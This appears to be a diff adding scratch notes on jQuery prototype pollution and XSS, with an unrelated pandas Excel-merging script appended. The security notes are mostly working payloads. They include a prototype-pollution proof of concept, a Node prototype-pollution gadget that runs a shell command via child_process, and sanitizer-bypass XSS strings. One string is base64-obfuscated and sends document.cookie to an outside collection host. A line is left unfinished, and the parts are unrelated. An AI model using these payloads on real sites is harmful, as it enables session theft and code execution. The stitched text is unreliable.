@@ -1,0 +1,84 @@
+<script>
+  $(document).ready(function() {
+    var obj1 = {
+      Name: "Miracle"
+    };
+
+    var obj2 = JSON.parse('{"__proto__": {"admin":true}}');
+
+    var extended_obj1 = $.extend(true,{}, obj1, obj2);
+
+    var obj = {}
+    console.log(obj);
+
+    if(obj.admin == true)
+    {
+        alert("polluted");
+    }
+  });
+
+</script>
+
+similar but much smaller: alert("Text: " + $("#test").text());  https://github.com//Cybernegro//CVE-2020-11023
+also https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
+and Michał Bentkowski is described to be one of the best in the world when it comes to javascript and client side vulns
+
+$.extend(true, {}, JSON.parse('{"__proto__": {"admin": true}}')) 
+
+if (user.isAdmin) {   console.log(Object.create(null));}
+
+
+list all objects so if user and isAdmin exists i can see it
+for (const [key, value] of Object.entries(window)) {
+    console.log(key, value);
+}
+
+
+USERINPUT = JSON.parse('{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}}}')
+
+===============
+
+Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
+
+
+
+
+founder of the bug: https://mksben.l0.cm/2020/05/jquery3.5.0-xss.html
+
+sanitizedHTML = "<style><style /><img src=x onerror=alert(1)>"
+or
+sanitizedHTML = '<img alt="<x" title="/><img src=x onerror=alert(1)>">'
+or
+sanitizedHTML = "<img src=x onerror=eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vd3d3LnRvcHRhbC5jb20vZGV2ZWxvcGVycy9wb3N0YmluLzE3MDQzMzYzNDA4NzgtNTAzMDgwOTcwNjA3Ni8/Yz0iK2RvY3VtZW50LmNvb2tpZQ=='))>"
+
+system_banner.innerHTML=sanitizedHTML;
+$('#system_banner').html(sanitizedHTML);
+
+====
+
+import pandas as pd
+
+# Load Excel file
+file_path = r"C:\path\to\your\file.xlsx"
+project_data_df = pd.read_excel(file_path, sheet_name='Project Data')
+personnel_df = pd.read_excel(file_path, sheet_name='Personnel')
+
+# Iterate over each row in project data
+for index, row in project_data_df.iterrows():
+    # Filter personnel data based on Well, Rig, and Date
+    filtered_personnel = personnel_df[(personnel_df['Well'] == row['Well']) &
+                                      (personnel_df['Rig'] == row['Rig']) &
+                                      (personnel_df['Date'] == row['Date'])]
+
+    # Assuming 'Company' and 'Category' are in separate rows in personnel data
+    company_row = filtered_personnel.loc[filtered_personnel['RowType'] == 'Company']
+    category_row = filtered_personnel.loc[filtered_personnel['RowType'] == 'Category']
+
+    # Create 'Company/Category' columns for each non-empty company
+    for i in company_row.dropna().columns:
+        company = company_row[i].values[0]
+        category = category_row[i].values[0]
+        project_data_df.at[index, f'Company/Category/{i}'] = f'{company} / {category}'
+
+# Save the updated DataFrame to a new Excel file
+project_data_df.to_excel(r"C:\path\to\your\output_file.xlsx", index=False)
